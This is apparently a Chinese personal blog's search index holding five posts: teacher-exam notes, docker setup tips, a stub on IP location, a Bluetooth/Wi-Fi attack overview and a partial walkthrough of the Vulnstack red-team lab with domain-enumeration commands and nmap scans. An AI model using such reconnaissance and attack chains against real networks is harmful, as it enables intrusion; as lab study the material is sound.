<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>教师资格证考试总结</title>
      <link href="2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是教师资格证考试"><a href="#什么是教师资格证考试" class="headerlink" title="什么是教师资格证考试"></a>什么是教师资格证考试</h2><p><a href="https://baike.baidu.com/item/教师资格证/3287811">教师资格证</a>考试，是由<a href="https://baike.baidu.com/item/教育部考试中心/5104094">教育部考试中心</a>官方设定的<a href="https://baike.baidu.com/item/教师资格考试/4063442">教师资格考试</a>。</p><p>2012年之前，教师资格考试是由各省自行组织命题和考试。主要针对<a href="https://baike.baidu.com/item/非师范专业/15529578">非师范专业</a>需要考取教师资格证的考生。（<strong>师范专业学校直接颁发教师资格证</strong>）</p><p>2012年后，教师资格考试纳入统考试点和省考相结合的模式。到2018年除了新疆，内蒙古，西藏三个地区外<strong>其他省份全部纳入了教师资格统考</strong>，由教育部考试中心出题，地方教育考试院主考。主要<strong>针对师范专业和非师范专业需要考取教师资格证的考生</strong>。</p><h2 id="报考条件"><a href="#报考条件" class="headerlink" title="报考条件"></a>报考条件</h2><p>符合以下基本条件的人员，可以报名参加教师资格考试：</p><p>1．具有中华人民共和国国籍；</p><p>2．遵守宪法和法律，热爱教育事业，具有良好的思想品德；</p><p>3．符合申请认定教师资格的体检标准；</p><p>4．符合《教师法》规定的学历要求。</p><p>（一）幼儿园教师资格，应当具备幼儿师范学校毕业及以上学历。</p><p>（二）小学教师资格，应当具备<a href="https://baike.baidu.com/item/中等师范学校/4909468">中等师范学校</a>毕业及以上学历。</p><p>（三）初中教师资格，应当具备高等<a href="https://baike.baidu.com/item/师范专科学校/7881407">师范专科学校</a>或者其他大学专科毕业及以上学历。</p><p>（四）高级中学和<a href="https://baike.baidu.com/item/中等职业学校/7487709">中等职业学校</a>教师资格，应当具备高等师范院校本科或者大学本科毕业及以上学历。</p><p>（五）中等职业学校实习指导教师资格，应当具备中等职业学校毕业及以上学历，并应当具有相当助理工程师以上<a href="https://baike.baidu.com/item/专业技术职务/6597015">专业技术职务</a>或中级以上工人技术等级。</p><p><strong>考生应在户籍(开封)、学籍(在哪上的大学就在哪考试)或人事关系(在哪工作就在哪考试)所在市州报名</strong>参加中小学教师资格考试。<strong>普通高等学校毕业及其毕业前一年级学生(就是说大三大四的可以参加报考)</strong>，以及在校<a href="https://baike.baidu.com/item/全日制研究生/10588952">全日制研究生</a>，可凭学校学籍管理部门出具的在籍学习证明报考，在就读学校所在地报名参加中小学教师资格考试。</p><p>被撤销教师资格的，5年内不得报名参加考试；受到剥夺政治权利，或故意犯罪受到有期徒刑以上刑事处罚的，不得报名参加考试。曾参加教师资格考试有作弊行为的，按照《<a href="https://baike.baidu.com/item/国家教育考试违规处理办法/6994647">国家教育考试违规处理办法</a>》(教育部令第33号，下同)的相关规定执行。</p><h2 id="统考地区"><a href="#统考地区" class="headerlink" title="统考地区"></a>统考地区</h2><p>北京、天津、河北、山西、辽宁、吉林、黑龙江、上海、江苏、浙江、安徽、福建、江西、山东、<strong>河南</strong>、湖南、湖北、广东、广西、海南、重庆、四川、贵州、云南、陕西、甘肃、宁夏、青海</p><p>本篇文章为针对统考地区的考试前的总结。</p><p>统考地区目前的考试内容如下：</p><blockquote><p>幼儿园：综合素质+保教知识与能力</p><p>小学：综合素质+教育教学知识与能力</p><p><strong>中学：综合素质+教育知识与能力+学科知识与能力</strong></p></blockquote><h2 id="关于考核的身体条件"><a href="#关于考核的身体条件" class="headerlink" title="关于考核的身体条件"></a>关于考核的身体条件</h2><p>“身体条件”应为教育教学能力的一部分，或者说是承担教育教学任务的“硬件”，因为教师(特别是小学和幼儿园教师)身体条件对教育教学效果有一定影响。《教师资格条例》第六条规定：“有教育教学能力应当包括符合国家规定的从事教育教学工作的身体条件。”教师身体条件主要是<strong>要求无传染性疾病，无精神病史，有完全的法律行为能力</strong>等。“身体条件”的具体标准参照师范教育类专业招生体检标准的有关规定执行。</p><h2 id="考试流程"><a href="#考试流程" class="headerlink" title="考试流程"></a>考试流程</h2><ol><li>考普通话证（语文老师要二级甲等以上(<strong>87分－91.99分之间</strong>)；其他科目要二级乙等以上(<strong>80分－86.99分之间</strong>） 一般3月到6月，9月到12月每个月可以考一次。</li><li>考心理学以及教育学（该考试半年一次，通常在3月和10月，  有效期要根据自己省份的规定，因此最好一次性通关；在考心理学和教育学时，就要报名好考试的等级——幼儿教师/小学/初中/高中&amp;高职/大学，你的学历一定要高你报名等级一级，如果你要教高中就一定要大专以上学历，另外大学教师证是提供给大学在职教师考的）(<strong>值得一提的是现在统考(国考)已经将这两门学科融入到了‘一次考试’的内容里面了，所以不用特殊报名，直接考笔试就OK了</strong>)</li><li>拿上你的以上三个证外加毕业证、身份证、体检，就可以去报名试讲——也就是“说课”，这个时候你要选好科目（就是要选好数学、语文之类的） 。说课一般是15分钟，考之前上网下一下模板。 在每年6月和11月，通过说课就可以拿证了。</li></ol><h2 id="考试时间安排"><a href="#考试时间安排" class="headerlink" title="考试时间安排"></a>考试时间安排</h2><p><strong>时间安排大致如下</strong></p><div class="table-container"><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>1月14日</td><td>2021上半年笔试报名</td></tr><tr><td>3月3日</td><td>2020下半年面试成绩查询</td></tr><tr><td>3月13日</td><td>2021上半年笔试考试</td></tr><tr><td>4月15日</td><td>2021上半年笔试查询2021上半年面试报名</td></tr><tr><td>5月15-16日</td><td>2021上半年面试考试</td></tr><tr><td>6月12日</td><td>2021上半年面试成绩查询</td></tr><tr><td><strong>时间</strong></td><td><strong>事件</strong></td></tr><tr><td>9月3日</td><td>2021下半年笔试报名</td></tr><tr><td>10月30日</td><td>2021下半年笔试考试</td></tr><tr><td>12月10日</td><td>2021下半年笔试成绩查询2021下半年面试报名</td></tr><tr><td>2022年1月8-9日</td><td>2021下半年面试考试</td></tr><tr><td>1月14日</td><td>2022上半年笔试报名</td></tr><tr><td>3月3日</td><td>2021下半年面试成绩查询</td></tr></tbody></table></div><h3 id="细分时间安排"><a href="#细分时间安排" class="headerlink" title="细分时间安排"></a>细分时间安排</h3><p>笔试 <strong>各科目考试时间为120分钟</strong>。</p><p>面试 <strong>考试时间为20分钟</strong>。</p><h1 id="考试内容总结"><a href="#考试内容总结" class="headerlink" title="考试内容总结"></a>考试内容总结</h1><p><strong>1、教师资格证考试有哪些学段和学科</strong></p><p>教师资格证考试包括<strong>幼儿园、小学、中学，</strong>其中<strong>中学又分为初中、高中及中职，</strong>下边我来挨个说说各学段包含的学科：</p><p>这里只总结高中的相关的学科</p><p><strong>高中：</strong>包括17个学科，分别为语文、数学、英语、物理、化学、生物、思想品德、历史、地理、体育与健康、音乐、美术、信息技术、通用技术、心理健康教育、日语、俄语；</p><p><strong>注意：</strong>我们教师资格证的考试对于考生的专业是不作要求的，比如你是学音乐的，但你照样可以选择报考体育学科。<strong>但是，在这里建议各位考生，尽量还是选一个和你专业相近的科目去报考，因为许多地区在进行教师招聘时，都会要求考生的报考科目与所学专业一致或相近</strong>。</p><p><img src="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/v2-5289f18b3406de812ec7c102c62a946b_r.jpg" alt="教师资格证笔试科目"></p><p><img src="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/v2-44827c601dad868e49eb37e5b33fb34e_720w.jpg" alt="中学除科目三的考试内容"></p><p>关于考试的试题，这里就没什么好总结的了，因为考试的话根据我的经验，<strong>最好的了解与提升方式就是看往年的真题</strong>，明天想办法拿到真题再说吧。</p><p><a href="教师资格证考试总结/2020下半年教师资格考试中学《综合素质》试题_天津中公教育.pdf">《综合素质》真题pdf版，点击下载</a>。想要答案的请加我qq，[ :萌: ] 2994016494。</p><p><a href="https://wenku.baidu.com/view/60fc3ddf4b7302768e9951e79b89680203d86b8c.html">《教育知识与能力》真题链接</a></p><p>个人感觉大部分选择题都是些常识性的题目，这两门是同意都要考得，涵盖的是教育学与心理学相关的知识，需要资料较为统一。</p><p>然后就是<strong>《学科知识与教学能力》了</strong>，如果前面的两门相当于高考时的<strong>语数外</strong>的话，这一门分的就是文综与理综了，考的知识点专精，例如<strong>英语学科与教学能力</strong>的往年的试题如下</p><p><a href="https://www.233.com/teacher/zxzzt/201806/28090801272.html">英语学科往年试题</a></p><p>之后就是个把月之后还有的面试了，面试相关的知识较为简单，那个等对教师资格证的考试体制有了更深一步的了解之后会再去总结，面试的话主要就是备课、上课、面试几大步吧应该。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教师资格证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运维经验贴</title>
      <link href="2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
      <url>2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="Centos运维经验"><a href="#Centos运维经验" class="headerlink" title="Centos运维经验"></a>Centos运维经验</h1><h2 id="docker相关的经验"><a href="#docker相关的经验" class="headerlink" title="docker相关的经验"></a>docker相关的经验</h2><h3 id="直接对docker的操作"><a href="#直接对docker的操作" class="headerlink" title="直接对docker的操作"></a>直接对docker的操作</h3><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo yum install -y yum-utils  device-mapper-persistent-data  lvm2yum-config-manager --add-repo https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repodnf install https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;7&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.13-3.1.el7.x86_64.rpmdnf install docker-cesudo yum install docker-ce docker-ce-clisudo systemctl start dockerdocker --version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo systemctl enable docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h4><blockquote><ul><li><p>docker中国官方</p> <pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;registry.docker-cn.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>网易</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;hub-mirror.c.163.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>USTC</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>阿里云　　</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;你的ID&gt;.mirror.aliyuncs.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></blockquote><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">换源的方法是编辑&#x2F;etc&#x2F;docker&#x2F;daemon.json（如果不存在则创建）:&#123;    &quot;registry-mirrors&quot;:[         &quot;http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;,         &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;,         &quot;http:&#x2F;&#x2F;registry.docker-cn.com&quot;    ] ,    &quot;insecure-registries&quot;:[       &quot;docker.mirrors.ustc.edu.cn&quot;,         &quot;registry.docker-cn.com&quot;    ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="重启docker"><a href="#重启docker" class="headerlink" title="重启docker"></a>重启docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">systemctl start docker   # 一般开启docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="对docker容器的操作"><a href="#对docker容器的操作" class="headerlink" title="对docker容器的操作"></a>对docker容器的操作</h3><h4 id="复制文件到docker容器"><a href="#复制文件到docker容器" class="headerlink" title="复制文件到docker容器"></a>复制文件到docker容器</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo docker cp 源vps绝对路径 容器ID:容器内的目标绝对路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装CTFd"><a href="#安装CTFd" class="headerlink" title="安装CTFd"></a>安装CTFd</h3><pre class="line-numbers language-none"><code class="language-none">sudo docker run --name ctfd -d -p 80:8000 ctfd&#x2F;ctfd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学总刊</title>
      <link href="2021/06/13/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/13/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h1><h2 id="通过QQ电话实现低精度ip定位"><a href="#通过QQ电话实现低精度ip定位" class="headerlink" title="通过QQ电话实现低精度ip定位"></a>通过QQ电话实现低精度ip定位</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无线安全</title>
      <link href="2021/06/10/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
      <url>2021/06/10/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝牙攻击"><a href="#蓝牙攻击" class="headerlink" title="蓝牙攻击"></a>蓝牙攻击</h1><h2 id="蓝牙是什么"><a href="#蓝牙是什么" class="headerlink" title="蓝牙是什么?"></a>蓝牙是什么?</h2><blockquote><p>在当前的网络应用中，物联网具有对物品多样性、低成本、低速率、短距离等特征的泛在需求，这类需求主要通过蓝牙等低速网络协议实现。蓝牙是一种短距离通信开放标准，利用嵌入式芯片实现通讯距离在10m～100m之间的无线连接。蓝牙的设计目标在于通过统一的近距离无线连接标准使各生产商生产的个人设备都能通过该网络协议更方便地实现低速率数据传输和交叉操作。蓝牙技术具有低成本、低功耗、模块体积小、易于集成等特点，非常适合在新型物联网移动设备中应用。</p></blockquote><h2 id="几种攻击方式"><a href="#几种攻击方式" class="headerlink" title="几种攻击方式"></a>几种攻击方式</h2><p>引用自此、<a href="https://www.chomptech.com/3843.html">https://www.chomptech.com/3843.html</a></p><blockquote><p><strong>针对蓝牙的攻击威胁大体上可以分为两种，一种是对不同无线网络均适用的攻击，—种是针对蓝牙特定的攻击。</strong></p><p>3.1拒绝服务攻击：拒绝服务攻击(DOS)的原理是在短时间内连续向被攻击目标发送连接请求，使被攻击目标无法与其他设备正常建立连接。蓝牙的逻辑链路控制和适配协议规定了蓝牙设备的更高层协议可以接收和发送64KB的数据包，类似于ping数据包，针对这个特点，攻击者可以发送大量ping数据包占用蓝牙接口，使蓝牙接口不能正常使用，并目一直使蓝牙处于高频工作状态从而耗尽设备电池。DoS攻击流程图如图4所示。</p><p>3.2中间人攻击：在两个设备之间的攻击者截获数据一方发送的数据后再转发给另一方，可在不影响双方通信的情况下获得双方通信的内容，是一种广泛应用于无线网络的攻击方式。蓝牙4.0版本的低功耗蓝牙技术(BluetoothLowEnergy，BLE)在设计初始时有防范中间人攻击的安全措施，但是在产品阶段考虑到产品功耗成本等因素，这方面并没有得到足够的重视，依然容易受到攻击。最常见的是用软硬件结合的蓝牙攻击设备伪造BLE通信进行中间人攻击。中间人攻击示意图如图5所示。</p><p>3.3漏洞窃听：蓝牙窃听可以通过对蓝牙漏洞的攻击来实现，蓝牙中的OBEX(ObjectExchange)协议，即对象交换协议在早期的蓝牙产品规范中没有强制要求使用权鉴，所以攻击者可以利用此漏洞在被攻击者手机没有提示的情况下链接到被攻击手机，获取对手机内各种多媒体文件以及短信通话记录等文件的增删改权限，甚至可以通过手机命令拨打接听电话。具有这些攻击功能的指令代码被黑客写成了手机软件，可在网络上下载。普通人_般会使用图形化界面去操作，某些山寨手机中甚至自带这项功能，当和别的手机配对成功后即可获得对方手机的操作权限。不过随着蓝牙技术的不断提升，针对早期蓝牙漏洞的攻击现在已经越来越少见。</p><p>3.4重放攻击：重放攻击的原理是监听或者伪造双方通信的认证凭证，经过处理后再回发给被攻击方进行认证。蓝牙传输过程中有79个信道，攻击者可以通过监听信道、计算跳频时序、回放已授权设备的IZI令来进行攻击。V4.2的标准中已经增加了防止重放攻击的协议。</p><p>3.5配对窃听：蓝牙V2.0及之前更早版本默认的4位PIN码很容易被暴力破解，因为低位数字排列组合的方式十分有限，蓝牙V4.0的LE配对同理。攻击者只要监听到足够的数据帧，就可以通过暴力破解等方式确定密钥，模拟通信方，实现攻击目的。</p><p>3.6位置攻击：每个蓝牙设备都有唯一的6字节序列号作为设备地址，这种序列标识由于在使用过程中不发生改变很容易泄露设备的位置信息。攻击者可以根据蓝牙的调频连接机制和寻呼机制、设备标识符和其他通信参数获得被攻击者设备的地理位置。</p><p>3.7简单配对模式攻击：蓝牙V2.0规定的SSP安全简单配对连接方式并不安全，是由于使用了静态口令而无法防止中间人攻击，并且一旦攻击者取得了口令，在一段时间内可以用此口令进行持续性攻击。</p></blockquote><p>暂时因为linux虚拟机的问题解决不了而放弃。。。</p><h1 id="WIFI攻击"><a href="#WIFI攻击" class="headerlink" title="WIFI攻击"></a>WIFI攻击</h1><h2 id="什么是WIFI"><a href="#什么是WIFI" class="headerlink" title="什么是WIFI"></a>什么是WIFI</h2><blockquote><p>无线网络上网可以简单的理解为无线上网，几乎所有<a href="https://baike.baidu.com/item/智能手机">智能手机</a>、<a href="https://baike.baidu.com/item/平板电脑">平板电脑</a>和笔记本电脑都支持Wi-Fi上网，是当今使用最广的一种无线网络传输技术。实际上就是把有线网络信号转换成无线信号，就如在开头为大家介绍的一样，使用无线路由器供支持其技术的相关电脑，<a href="https://baike.baidu.com/item/手机/6342">手机</a>，平板等接收。手机如果有Wi-Fi功能的话，在有Wi-Fi无线信号的时候就可以不通过移动联通的网络上网，省掉了流量费。</p><p>无线网络无线上网在大城市比较常用，虽然由Wi-Fi技术传输的无线通信质量不是很好，数据安全性能比蓝牙差一些，传输质量也有待改进，但传输速度非常快，可以达到54Mbps，符合个人和社会信息化的需求。Wi-Fi最主要的优势在于不需要布线，可以不受布线条件的限制，因此非常适合移动办公用户的需要，并且由于发射信号功率低于100mw，低于手机发射功率，所以Wi-Fi上网相对也是最安全健康的。</p><p>但是Wi-Fi信号也是由有线网提供的，比如家里的<a href="https://baike.baidu.com/item/ADSL">ADSL</a>，小区宽带等，只要接一个<a href="https://baike.baidu.com/item/无线路由器">无线路由器</a>，就可以把有线信号转换成Wi-Fi信号。国外很多发达国家城市里到处覆盖着由政府或大公司提供的Wi-Fi信号供居民使用，我国也有许多地方实施”<a href="https://baike.baidu.com/item/无线城市">无线城市</a>“工程使这项技术得到推广。在4G牌照没有发放的试点城市，许多地方使用4G转Wi-Fi让市民试用。(现在已经5G了，也就是说百度百科的某些信息都已经过时了)</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WEB靶场复现总刊</title>
      <link href="2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="域渗透的基础知识"><a href="#域渗透的基础知识" class="headerlink" title="域渗透的基础知识"></a>域渗透的基础知识</h2><p><a href="https://www.freebuf.com/company-information/172630.html">干货！内网渗透测试之域渗透详解！收藏！</a></p><p><a href="http://www.91ri.org/10154.html">内网渗透之-域渗透基础</a></p><p>希望今天可以简单学习一下域渗透的基础知识，为明天的域渗透实战做好准备    ——2021年6月4日</p><h3 id="域渗透场景"><a href="#域渗透场景" class="headerlink" title="域渗透场景"></a>域渗透场景</h3><p>场景一：某处于域中的服务器通过路由做端口映射，对外提供web服务，我们通过web脚本漏洞获得了该主机的system权限，如果甲方有进一步的内网渗透测试需求，以证明企业所面临的巨大风险，这个时候就需要做内网的域渗透。</p><p>……</p><p>域渗透看起来就像是所获成果的效益最大化，拿到system权限之后，再用该拿到权限的主机作为跳板打通内网</p><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</p><p><strong>&lt;域控制器、域成员、web服务器&gt;</strong></p><p>域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p><h3 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h3><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain        #查看时间服务器net user &#x2F;domain        #查看域用户net view &#x2F;domain        #查看有几个域net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员net group &quot;domain controllers&quot; &#x2F;domain       #查看域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红日安全靶场"><a href="#红日安全靶场" class="headerlink" title="红日安全靶场"></a>红日安全靶场<01 att&ck红队评估></01></h2><h3 id="零、靶场介绍与下载"><a href="#零、靶场介绍与下载" class="headerlink" title="零、靶场介绍与下载"></a>零、靶场介绍与下载</h3><h4 id="0-靶场下载地址"><a href="#0-靶场下载地址" class="headerlink" title="0.靶场下载地址"></a>0.靶场下载地址</h4><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">靶场下载地址</a></p><p><strong>靶场介绍</strong></p><pre class="line-numbers language-none"><code class="language-none">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019：一、环境搭建1.环境搭建测试2.信息收集二、漏洞利用3.漏洞搜索与利用4.后台Getshell上传技巧5.系统信息收集6.主机密码收集三、内网搜集7.内网--继续信息收集8.内网攻击姿势--信息泄露9.内网攻击姿势-MS08-067 10.内网攻击姿势-SMB远程桌面口令猜测11.内网攻击姿势-Oracle数据库TNS服务漏洞12.内网攻击姿势-RPC DCOM服务漏洞四、横向移动13.内网其它主机端口-文件读取14.内网其它主机端口-redis15.内网其它主机端口-redis Getshell16.内网其它主机端口-MySQL数据库17.内网其它主机端口-MySQL提权五、构建通道18.内网其它主机端口-代理转发六、持久控制19.域渗透-域成员信息收集20.域渗透-基础服务弱口令探测及深度利用之powershell21.域渗透-横向移动[wmi利用]22.域渗透-C2命令执行23.域渗透-利用DomainFronting实现对beacon的深度隐藏24.域渗透-域控实现与利用七、痕迹清理25、日志清理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><h4 id="1-环境搭建测试"><a href="#1-环境搭建测试" class="headerlink" title="1.环境搭建测试"></a>1.环境搭建测试</h4><p>先配置靶场环境，</p><p><code>统一密码：hongrisec@2019</code>，但是有两个主机的密码是需要修改的，这里我选择修改两个server主机为了<code>@dmin123</code>。</p><p>进入问7之后发现这个负责连接外网展示web界面的主机’坏掉了’，这里需要简单地配置一下。</p><p><a href="https://troyess.com/2021/06/03/vulnstack%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98-%E4%B8%80/">vulnstack内网靶场(一)保姆级教程</a></p><p>wrwrwr我太困了，眼疼，先上床追会儿剧。</p><p>主要就是打开三个虚拟机，</p><ol><li><p>先用<code>hongrisec@2019</code>这个密码进域控虚拟机机，然后进域成员虚拟机，注意这里都是需要改密码的。</p></li><li><p>然后打开win7的虚拟机进去直接就能用<code>hongrisec@2019</code>登录，但是提示要重新启动，这时候直接选择立即重新启动。</p></li><li>重启之后配置网卡。我这里两个图，直接按我下面的这样应该就是可以的(大概)</li><li>再web服务器win7上的c盘，找到PHP study并将其打开。</li></ol><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605002015556.png" alt="虚拟网络编辑器"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605002326199.png" alt="分别配置各个虚拟机的网络"></p><p>上面域控虚拟机名字写错了，应该是server 2008的，手抖手抖。</p><p><strong>大概情况就是下面的情况：</strong></p><div class="table-container"><table><thead><tr><th>模拟内、外网的网卡名与名下ip地址</th><th>连接该网卡的虚拟机</th></tr></thead><tbody><tr><td>VMnet1/192.168.52.0</td><td>环境里面的三个虚拟机server2008、server 2003、Windows 7都要先连接内网的网络适配器VMnet1</td></tr><tr><td>VMnet2/192.168.72.0</td><td>负责web服务的机器Windows 7和攻击机kali都要链接这个模拟外网的网络适配器VMnet2</td></tr></tbody></table></div><h4 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h4><p>模拟黑盒先试试，就是不进去win7看有没有什么服务，而是直接进入攻击机 kali里面通过扫描这种资产收集方式进行信息收集</p><p><strong>1.端口扫描</strong></p><p>因为这里已经知道只有一个外部ip(win7的ip了)，所以这里也直接可以免去对目标C段的扫描了，直接掏出诸神之眼nmap扫描。</p><p><a href="https://www.cnblogs.com/liaopeng123/p/11281516.html">nmap常见命令的使用</a></p><pre class="line-numbers language-none"><code class="language-none">nmap -T4 192.168.72.128 -p 1-65535  # 对目标主机进行全端口快速扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605004340032.png" alt></p><p>这里我们扫描简单得多了，因为”网络很好”，直接可以开T4，这里也是<strong>大概两分多钟</strong>就扫描完毕了，但是实战时有时T4是不行的似乎。</p><p>想看扫描过程的话加个参数<code>-v</code>即可</p><pre class="line-numbers language-none"><code class="language-none">nmap -T4 192.168.72.128 -v -p 1-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div class="table-container"><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>80</td><td>php探针</td></tr><tr><td>3306</td><td>mysql数据库</td></tr></tbody></table></div><p>然后可以使用dirsearch对80端口进行一个简单的目录扫描</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010554845.png" alt="image-20210605010554845"></p><p>80扫描到了phpMyAdmin的服务，这里应该直接在这里连接数据库3306的。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010800401.png" alt="PHP版本"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605010832281.png" alt="phpMyAdmin"></p><p>外网能进行的信息收集也就这么多了。</p><h3 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h3><h4 id="3-漏洞搜索与利用"><a href="#3-漏洞搜索与利用" class="headerlink" title="3.漏洞搜索与利用"></a>3.漏洞搜索与利用</h4><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/image-20210605005358760.png" alt="80端口的php 